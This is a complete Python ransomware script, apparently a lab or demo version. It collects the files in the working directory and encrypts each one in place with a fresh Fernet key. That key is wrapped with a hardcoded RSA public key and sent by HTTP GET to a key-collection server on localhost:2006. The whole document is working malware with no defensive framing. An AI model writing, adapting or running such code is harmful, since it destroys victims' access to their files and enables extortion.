import os
from cryptography.fernet import Fernet
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from base64 import b64encode
import requests


#  for finding some files 

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
    
print(files)

key = Fernet.generate_key()
print(key)

# Get the public key to encrypt data
public_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAk6eFO7LIfuzPTh5KQGuo\nVwYlFkegR/Wvj/ddRJpNYc65R5lp4jj4eDmE+QrTr287K7jIJzuPxhY7Pd6K44Lg\nUJJKLdkO+zgpcPkPUIbk1qKioFPmkQgEJeUYz8/vO5X1rtxfDH5lEphn/0D0A/bT\niL1ItpMVOG/jW0FpOWk4C4nyVLgN110FEjD6b529XGlgYK9H6gzqiyQiN8E+hq0U\nvYiQ3dFs0xymRpEPxzpi4Tbfhf9U+ImV32+5czizwYDoIvHR0fQwDPw9TWQkdnxE\nFKObvglSl+MUg7JfJG7++BftrL6zSIm2f5xqN1DnzieN8+Ba1t4ULRjNc+DgIbFT\n1QIDAQAB\n-----END PUBLIC KEY-----"
public_key = RSA.import_key(public_key)
# Initialize encryption cipher
cipher = PKCS1_OAEP.new(public_key)

# Encrypt data
encrypted_data = cipher.encrypt(key)


url = "http://localhost:2006/?key=" + b64encode(encrypted_data).decode()

requests.get(url)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
